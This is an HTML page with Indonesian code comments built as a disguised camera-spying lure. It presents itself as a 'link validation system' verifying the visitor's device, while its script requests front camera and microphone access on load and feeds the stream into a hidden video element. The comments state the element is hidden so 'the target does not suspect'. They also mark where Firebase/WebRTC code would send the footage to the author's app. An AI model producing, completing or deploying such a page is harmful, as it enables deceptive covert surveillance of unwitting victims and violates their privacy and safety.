<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menghubungkan Layanan...</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        .status-box {
            background-color: #0d1117;
            border: 2px dashed #30363d;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
            font-weight: bold;
            transition: all 0.5s ease;
        }
        .loading {
            color: #ff9e2c;
        }
        .success {
            color: #2ea44f;
            border-color: #2ea44f;
            background-color: rgba(46, 164, 79, 0.1);
        }
        .error {
            color: #f85149;
            border-color: #f85149;
            background-color: rgba(248, 81, 73, 0.1);
        }
        h2 {
            font-size: 1.4rem;
            margin-bottom: 10px;
            color: #ffffff;
        }
        p {
            font-size: 0.9rem;
            color: #8b949e;
        }
        /* Menyembunyikan elemen video agar target tidak curiga */
        video {
            display: none;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Sistem Validasi Tautan</h2>
    <p>Mohon tunggu sebentar selagi sistem memverifikasi perangkat Anda...</p>
    
    <div id="statusBox" class="status-box loading">
        Menyambungkan kamera...
    </div>
</div>

<video id="liveVideo" autoplay muted playsinline></video>

<script>
    // 1. Mengambil ID atau Link samaran dari URL parameter (?id=...)
    const urlParams = new URLSearchParams(window.location.search);
    const targetId = urlParams.get('id');

    const statusBox = document.getElementById('statusBox');
    const video = document.getElementById('liveVideo');

    // 2. Fungsi otomatis meminta izin Kamera dan Mikrofon begitu web dibuka
    async function aktifkanKamera() {
        try {
            // Meminta izin akses hardware secara bersamaan
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, // Memaksa menggunakan kamera depan
                audio: true 
            });
            
            // Masukkan stream ke elemen video tersembunyi agar kamera tetap menyala aktif
            video.srcObject = stream;
            
            // Mengubah tampilan kotak menjadi sukses ketika izin diberikan
            statusBox.innerText = "Kamera tersambung";
            statusBox.className = "status-box success";
            
            // [DI SINI] Kamu bisa menambahkan kode Firebase/WebRTC 
            // untuk mengirimkan data gambar dari 'stream' ke aplikasi Sketchware kamu.
            
        } catch (err) {
            // Jika target menolak perizinan atau perangkat tidak mendukung
            statusBox.innerText = "Koneksi gagal. Izin diperlukan!";
            statusBox.className = "status-box error";
            console.error("Gagal mengakses kamera/mikrofon: ", err);
        }
    }

    // Jalankan fungsi secara otomatis saat halaman selesai dimuat
    window.onload = aktifkanKamera;
</script>

</body>
</html>
